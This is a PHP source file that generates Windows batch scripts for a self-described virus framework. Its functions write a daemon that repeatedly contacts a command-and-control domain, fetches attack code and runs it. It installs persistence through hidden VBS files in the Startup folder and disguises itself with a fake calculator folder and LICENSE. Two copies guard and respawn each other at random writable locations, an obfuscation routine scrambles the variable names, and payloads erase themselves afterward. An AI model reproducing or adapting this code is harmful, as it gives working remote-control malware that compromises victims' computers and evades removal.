<?php

namespace Kelvinho\Virus\Attack\BaseScript;

/**
 * Class BaseScript for windows
 *
 * @package Kelvinho\Virus\Attack
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class Windows {
    /**
     * Virus's simple daemon. Reports back to the web server each interval.
     *
     * @param string $virus_id The virus id
     * @return string The shell code
     */
    public static function simpleMain(string $virus_id): string {
        ob_start(); //@formatter:off ?>
            @echo off
            SetLocal EnableDelayedExpansion

            rmdir /s /q "%~dp0libs\current"
            mkdir "%~dp0libs\current"

            :daemon_loop
            timeout <?php echo VIRUS_PING_INTERVAL . "\n"; ?>

            curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/ping --connect-timeout 5

            for /f "tokens=*" %%i in ('curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks --connect-timeout 5') do (
                if exist "%~dp0libs\current\%%i" (cls) else (
                    mkdir "%~dp0libs\current\%%i"
                    >"%~dp0libs\current\%%i\code.cmd" curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks/%%i/code
                    start /b cmd.exe /c "%~pd0libs\current\%%i\code.cmd"
                )
            )
            goto daemon_loop

            rem <script>window.location="http://google.com";</script>
            <?php return ob_get_clean(); //@formatter:on
    }

    /**
     * Obfuscate any incoming text by replacing variables and whatnot with H{md5 random hash}
     *
     * @param string $content
     * @return string
     */
    public static function obfuscate(string $content): string {
        $variables = ["unixTime", "daemon_loop", "hash_end",
            "pickRandomLocation_exploreDir_end", "pickRandomLocation_exploreDir", "pickRandomLocation",
            "ping_and_process_webserver", "checkPermission", "currentDir",
            "random_hash", "random_number", "random", "naked_hash", "startup_hash", "hash", "content",
            "hidden_ping_time", "hidden_ping_difference", "naked_last_active", "naked_ping_difference", "last_fetch", "ping_difference",
            "length_loop", "length", "text_len", "text", "count",
            "check_tampered_end", "check_tampered", "tampered_label",
            "start_scouting", "start_hidden_scouting", "scout_location",
            "naked_location", "new_hidden", "new_naked", "new_startup", "allowed", "naked", "hidden", "alone", "right_now"];
        usort($variables, fn($a, $b) => strlen($b) - strlen($a));
        $ids = [];
        for ($i = 0; $i < count($variables); $i++) array_push($ids, "H" . hash("md5", rand()));
        $content = str_replace($variables, $ids, $content);
        $newContent = "";
        foreach (preg_split("/((\r?\n)|(\r\n?))/", $content) as $line) {
            $line = trim($line);
            if ($line == "") continue;
            if (substr($line, 0, 4) == "rem ") continue;
            $newContent .= $line . "\n";
        }
        return $newContent;
    }

    /**
     * Base location will be controlled from the startup script, not from here. Here is just the complex main script
     *
     * @param string $virus_id
     * @param int $clockSpeed
     * @param bool $checkHash
     * @return string
     */
    public static function complexMain(string $virus_id, int $clockSpeed = SWARM_CLOCK_SPEED, bool $checkHash = false): string {
        $startup_folder = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        $devMode = true;
        $logFile = "C:\\Users\\15723\\Desktop\\log.txt";
        ob_start();//@formatter:off ?>
            @echo off
            SetLocal EnableDelayedExpansion

            rem loads initial constants
            set hidden_ping_time=0

            rem if first argument is "fetch", then this script has the duty to check current deployed attacks, download them and execute them. 2nd argument will be the libs folder
            if "%~1" == "fetch" (
                <?php if ($devMode) {echo "call :log \"(naked) Inside fetch script\" \n";} ?>
                for /f "tokens=*" %%i in ('curl -sL <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do (
                    if exist "%~2\current\%%i" (call) else (
                        mkdir "%~2\current\%%i"
                        mkdir "%~2\utils"
                        >"%~2\current\%%i\code.cmd" curl -sL <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks/%%i/code
                        start /b cmd.exe /c "%~2\current\%%i\code.cmd"
                    )
                )
                exit /b 0
            )
            rem asynchronously scout for a location and then reporting back
            if "%~1" == "scout" (
                call :pickRandomLocation "%~2" location
                >"%~pd0ic" echo scout^|!location!
                exit /b 0
            )
            if "%~1" == "hidden_scout" (
                call :pickRandomLocation "%~2" location
                >"%~pd0hic" echo scout^|!location!
                exit /b 0
            )

            rem if have data file (/dt), then read variables from it. Should have variables "type", "libs" and "base". The data file is supposed to be read once on boot only, and is not repeatedly read
            if exist "%~pd0dt" for /F "usebackq tokens=*" %%i in ("%~dp0dt") do set %%i

            rem handling incoming messages once
            if exist "%~pd0ic" for /F "usebackq delims=| tokens=1,2" %%a in ("%~dp0ic") do (
                if "%%a" == "type" set type=%%b
                if "%%a" == "libs" set libs=%%b
                if "%%a" == "base" set base=%%b
                if "%%a" == "scout" set scout_location=%%b
                rem for naked, as "ping" signal can only come from the hidden virus
                if "%%a" == "ping" call :unixTime hidden_ping_time
                rem for hidden, because this needs to know where the naked one is at
                if "%%a" == "naked_location" (
                    set naked_location=%%b
                    call :hash "%%b\mn.cmd" naked_hash
                    call :hash "<?php echo $startup_folder; ?>\U!naked_hash:~0,5!.vbs" startup_hash
                )
            )

            rem delete incoming file
            del "%~pd0ic" 2>nul

            rem quality of life
            set naked="!type!" == "0"

            rem checks existence of startup file and create one if necessary
            if %naked% (
                call :hash "%~f0" naked_hash
                if not exist "<?php echo $startup_folder; ?>\U!naked_hash:~0,5!.vbs" call :new_startup "!naked_hash!" "%~dp0"
            )

            rem scout out for new locations
            set scout_location=%base%
            if %naked% (
                call :start_scouting
            ) else (
                call :start_hidden_scouting
            )

            <?php if ($devMode) { ?>
                if %naked% (call :log "naked---") else (call :log "hidden---")
                call :log "  libs folder: %libs%"
                call :log "  base folder: %base%"
                call :log "  naked location: %naked_location%"
                call :log "  script location: %~f0"
            <?php } ?>

            rem time-sensitive stuff just before hitting the daemon loop
            call :unixTime right_now
            set /a last_fetch=!right_now!
            set /a naked_last_active=!right_now!+<?php echo SWARM_CREATION_MULTIPLIER * $clockSpeed . "\n"; ?>

            :daemon_loop
            call :unixTime right_now

            if %naked% (
                call :ping_and_process_webserver

                rem save data
                >"%~dp0dt" (
                    echo type=!type!
                    echo libs=!libs!
                    echo base=!base!
                )

                rem echos current time to og (outgoing) file, so that hidden can check that naked is still running well
                >"%~pd0og" echo %right_now%

                rem handling incoming messages
                if exist "%~pd0ic" for /F "usebackq delims=| tokens=1,2" %%a in ("%~dp0ic") do (
                    if "%%a" == "ping" call :unixTime hidden_ping_time
                    if "%%a" == "scout" (
                        set scout_location=%%b
                        <?php if ($devMode) {echo "call :log \"(naked) scout location received: !scout_location!\"\n";} ?>
                    )
                )
                >"%~pd0ic" type nul
                set /a hidden_ping_difference=!right_now!-!hidden_ping_time!

                if !hidden_ping_difference! geq <?php echo SWARM_CHECK_MULTIPLIER * $clockSpeed; ?> goto hidden_tampered_label
                timeout <?php echo $clockSpeed; ?> 2>nul 1>nul
                goto :daemon_loop

                :hidden_tampered_label
                call :new_hidden
                set /a hidden_ping_time=!right_now!+<?php echo SWARM_CREATION_MULTIPLIER * $clockSpeed . "\n"; ?>
                goto :daemon_loop
            )

            if not %naked% (
                rem handling incoming messages
                if exist "%~pd0hic" for /F "usebackq delims=| tokens=1,2" %%a in ("%~dp0hic") do if "%%a" == "scout" (
                    set scout_location=%%b
                    <?php if ($devMode) {echo "call :log \"(hidden) scout location received: !scout_location!\"\n";} ?>
                )
                del "%~pd0hic" 2>nul

                rem checking whether the naked one is tampered
                call :check_tampered "!naked_location!\mn.cmd" "!naked_hash!" tampered & if "!tampered!" == "1" goto tampered_label
                call :check_tampered "<?php echo $startup_folder; ?>\U!naked_hash:~0,5!.vbs" "!startup_hash!" tampered & if "!tampered!" == "1" goto tampered_label

                rem checking whether the naked one is still alive using its og (outgoing) file
                if not exist "!naked_location!\og" (goto tampered_label)
                <"!naked_location!\og" set /p naked_last_active=
                set /a naked_ping_difference=!right_now!-!naked_last_active!
                if !naked_ping_difference! geq <?php echo SWARM_CHECK_MULTIPLIER * $clockSpeed; ?> (goto tampered_label)

                rem everything is good, so just ping the naked telling that I'm still alive and well
                >>"!naked_location!\ic" echo ping^|_
                timeout <?php echo $clockSpeed; ?> 2>nul 1>nul
                goto :daemon_loop

                :tampered_label
                <?php if ($devMode) {echo "call :log \"(hidden) naked script is tampered (naked_location: !naked_location!, naked_hash: !naked_hash!, startup_hash: !startup_hash!), creating new...\"\n";} ?>
                call :new_naked
                set /a naked_last_active=!right_now!+<?php echo SWARM_CREATION_MULTIPLIER * $clockSpeed . "\n"; ?>
                >"!naked_location!\og" echo !naked_last_active!
                goto :daemon_loop
            )
            EndLocal
            exit /b 0

            <?php echo self::functions() . "\n"; ?>
            :ping_and_process_webserver
            rem ping if over <?php echo VIRUS_PING_INTERVAL; ?> seconds, expects variable "right_now"
            set /a ping_difference=%right_now%-%last_fetch%
            if %ping_difference% geq <?php echo VIRUS_PING_INTERVAL; ?> (
                curl -sL <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/ping
                start /b cmd.exe /c ""%~f0" "fetch" "!libs!""
                set /a last_fetch=%right_now%
            )
            exit /b 0

            rem assumes %base% location is there in the background
            :start_scouting
            start /b cmd.exe /c ""%~f0" scout "!base!""
            exit /b 0
            :start_hidden_scouting
            start /b cmd.exe /c ""%~f0" hidden_scout "!base!""
            exit /b 0

            :new_startup
            rem string%1.hash string%2.naked_location
            SetLocal EnableDelayedExpansion & set naked_hash=%~1
            >"<?php echo $startup_folder; ?>\U!naked_hash:~0,5!.vbs" (
                echo On Error Resume Next
                rem echo CreateObject("WScript.Shell")^.Run chr(34) ^& "%~2\mn.cmd" ^& chr(34), 0, False
                echo CreateObject^(^"WScript^.Shell^"^)^.Run chr^(34^) ^& ^"%~2\mn^.cmd^" ^& chr^(34^)^, 0^, False
            )
            EndLocal
            exit /b 0

            :new_hidden
            SetLocal EnableDelayedExpansion
            rem call :pickRandomLocation "%base%" location
            set location=%scout_location%
            call :start_scouting
            call :random random_number
            mkdir "!location!"
            copy "%~f0" "!location!\H!random_number!.cmd"
            >"!location!\ic" (
                echo type^|1
                echo libs^|%libs%
                echo base^|%base%
                echo naked_location^|%~pd0
                echo scout^|!scout_location!
            )
            start /b cmd.exe /c "!location!\H!random_number!.cmd"
            EndLocal
            exit /b 0

            :new_naked
            rem cleaning things up
            del "%naked_location%\mn.cmd"
            del "%naked_location%\dt"
            del "%naked_location%\ic"
            del "%naked_location%\og"
            del "<?php echo $startup_folder; ?>\U%naked_hash:~0,5%.vbs"
            rem picking a new location for naked
            rem call :pickRandomLocation "%base%" naked_location
            set naked_location=%scout_location%
            call :start_hidden_scouting
            mkdir "!naked_location!"
            copy "%~f0" "!naked_location!\mn.cmd"
            >"!naked_location!\dt" type nul
            >"!naked_location!\ic" (
                echo type^|0
                echo libs^|%libs%
                echo base^|%base%
                echo ping^|_
                echo scout^|!scout_location!
            )
            call :hash "!naked_location!\mn.cmd" naked_hash
            call :new_startup "!naked_hash!" "!naked_location!"
            call :hash "<?php echo $startup_folder; ?>\U%naked_hash:~0,5%.vbs" startup_hash
            start /b cmd.exe /c "!naked_location!\mn.cmd"
            exit /b 0

            :check_tampered
            rem string%1.file string%2.hash -> string%3.1 if tampered, 0 if not
            SetLocal EnableDelayedExpansion & set /a tampered=0
            if not exist "%~1" (set /a tampered=1 & goto check_tampered_end)
            <?php if ($checkHash) { ?>
            call :hash "%~1" hash
            if not "!hash!"=="%~2" (set /a tampered=1 & goto check_tampered_end)
            <?php } ?>
            :check_tampered_end
            EndLocal & set %3=%tampered%
            exit /b 0

            <?php if ($devMode) { ?>
                :log
                >>"<?php echo $logFile; ?>" echo %~1
                exit /b 0
            <?php } ?>
            <?php return ob_get_clean();//@formatter:on
    }

    /**
     * Generic batch functions that programs may include and use
     *
     * @return string The functions
     */
    private static function functions(): string {
        ob_start();//@formatter:off ?>:length
            SetLocal EnableDelayedExpansion & set /a text_len = 0 & set text=%~1
            :length_loop
            if not "!text:~%text_len%!"=="" (set /A text_len += 1 & goto :length_loop)
            EndLocal & set %~2=%text_len%
            exit /b 0
            :hash
            SetLocal EnableDelayedExpansion & set /a count=0 & set content=""
            for /f %%a in ('certutil -hashfile "%~1" sha256') do (set /a count+=1 & set content=%%a
                if "!count!" == "2" (goto hash_end))
            :hash_end
            EndLocal & set %2=%content%
            exit /b 0
            :random
            SetLocal EnableDelayedExpansion & set /a random_hash=67*(%random%+601*%random_hash%+1451)+2143 & set /a random_hash%%=31081
            EndLocal & set %1=%random_hash%
            exit /b 0
            :pickRandomLocation
            SetLocal EnableDelayedExpansion & call :pickRandomLocation_exploreDir "%~1" 0 10000 total nul
            call :random random_number
            set /a random_number%%=%total%
            call :pickRandomLocation_exploreDir "%~1" 0 %random_number% nul currentDir
            EndLocal & set %2=%currentDir%
            exit /b 0
            :pickRandomLocation_exploreDir
            SetLocal EnableDelayedExpansion & set /a count=%2
            for /d %%d in ("%~1\*") do (
                call :checkPermission "%%d" allowed & set currentDir=%%d
                if "!allowed!" == "1" (set /a count+=1 & if /i !count! geq %~3 (goto pickRandomLocation_exploreDir_end)
                    call :pickRandomLocation_exploreDir "%%d" !count! "%3" count currentDir & if /i !count! geq %~3 (goto pickRandomLocation_exploreDir_end)))
            :pickRandomLocation_exploreDir_end
            EndLocal & (
                set %4=%count%
                set %5=%currentDir%
            )
            exit /b 0
            :checkPermission
            SetLocal EnableDelayedExpansion & copy nul "%~1\12f99f53144294750fe8713d580eda286f4bd95cd9c840db8ab957def8040028" 2>nul 1>&2
            if "%errorLevel%" == "0" (del "%~1\12f99f53144294750fe8713d580eda286f4bd95cd9c840db8ab957def8040028" & EndLocal & set %2=1) else (EndLocal & set %2=0)
            exit /b 0
            :unixTime
            SetLocal EnableExtensions EnableDelayedExpansion
            for /f %%x in ('WMic path win32_utcTime get /format:list') do (set %%x 1>nul 2>nul)
            set /a z=(14-100%Month%%%100)/12, y=10000%Year%%%10000-z
            set /a ut=y*365+y/4-y/100+y/400+(153*(100%Month%%%100+12*z-3)+2)/5+Day-719469
            set /a ut=ut*86400+100%Hour%%%100*3600+100%Minute%%%100*60+100%Second%%%100
            EndLocal & set "%1=%ut%"
            exit /b 0
            <?php return ob_get_clean();//@formatter:on
    }

    /**
     * Init script. This will be the code initially downloaded and run using the entry point instructions. This will setup several things:
     * - /libs/current/{attack_id}/: contain directories named after attack ids, code.cmd in them which contains the shell code
     * - /libs/utils/: contain 3rd party tools and binaries that can be used by the payloads
     * - /entry.cmd: the virus daemon. script in startup folder will invoke this, and this will constantly report back to the web server
     * - startup/SU.vbs: placed in the startup folder, which will invoke entry.cmd
     *
     * @param string $virus_id The virus's id
     * @param string $user_handle The user handle
     * @param string $homeDirectory
     * @return string The shell code
     */
    public static function initStandalone(string $virus_id, string $user_handle, string $homeDirectory = "%appData%\\Calculator"): string {
        $startup_directory = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        $UFile = "$startup_directory\\U" . substr($virus_id, 0, 5) . ".vbs";
        ob_start();//@formatter:off ?>
            rmdir /s /q "<?php echo $homeDirectory; ?>"
            mkdir "<?php echo $homeDirectory; ?>"
            mkdir "<?php echo "$homeDirectory\\libs"; ?>"
            mkdir "<?php echo "$homeDirectory\\libs\\current"; ?>"
            mkdir "<?php echo "$homeDirectory\\libs\\utils"; ?>"
            >"<?php echo "$homeDirectory\\entry.cmd"; ?>" curl -L <?php echo ALT_DOMAIN . "/new/win/$user_handle/entry/$virus_id\n" ?>
            >"<?php echo "$UFile"; ?>" echo On Error Resume Next
            >>"<?php echo "$UFile"; ?>" echo CreateObject^(^"WScript^.Shell^"^)^.Run chr^(34^) ^& ^"<?php echo $homeDirectory; ?>\entry^.cmd^" ^& chr^(34^)^, 0^, False
            "<?php echo $UFile; // below are just additional things to make the virus looks legit
            ?>"
            >"<?php echo "$homeDirectory\\LICENSE"; ?>" curl -L <?php echo ALT_DOMAIN . "/new/win/$user_handle/license\n" ?>
            >"<?php echo $homeDirectory; ?>\calculator.cmd" echo calc.exe
            rem <script>window.location = "http://google.com";</script>
            cls
            <?php return ob_get_clean();//@formatter:on
    }

    /**
     * Connects with the web server to see if it has accepted the results. If yes then quits the loop and allow the
     * script to continue. This is intended to be placed in the payload rather than on the host computer.
     *
     * @param string $virus_id The virus id
     * @param string $attack_id The attack id
     * @param string $uploadCode The code to upload the results
     * @return string The shell code
     */
    public static function payloadConfirmationLoop(string $virus_id, string $attack_id, string $uploadCode): string {
        ob_start();//@formatter:off ?>
            SetLocal EnableDelayedExpansion & set /a trials = 0
            :payload_confirmation_loop
            set /a trials+=1
            if %trials% geq <?php echo ATTACK_UPLOAD_RETRIES; ?> goto end_payload_confirmation_loop
            <?php echo "$uploadCode\n"; ?>
            timeout <?php echo ATTACK_UPLOAD_RETRY_INTERVAL . "\n"; ?>
            for /f "tokens=*" %%i in ('curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks --connect-timeout 5') do if "%%i"=="<?php echo $attack_id; ?>" goto payload_confirmation_loop
            :end_payload_confirmation_loop
            EndLocal
            <?php return ob_get_clean();//@formatter:on
    }

    /**
     * Cleaning up the payload after it has executed.
     *
     * @return string The shell code
     */
    public static function cleanUpPayload(): string {
        ob_start(); ?>
        start /b cmd /c "timeout 3 & rmdir /s /q %~pd0"
        <?php return ob_get_clean();
    }
}
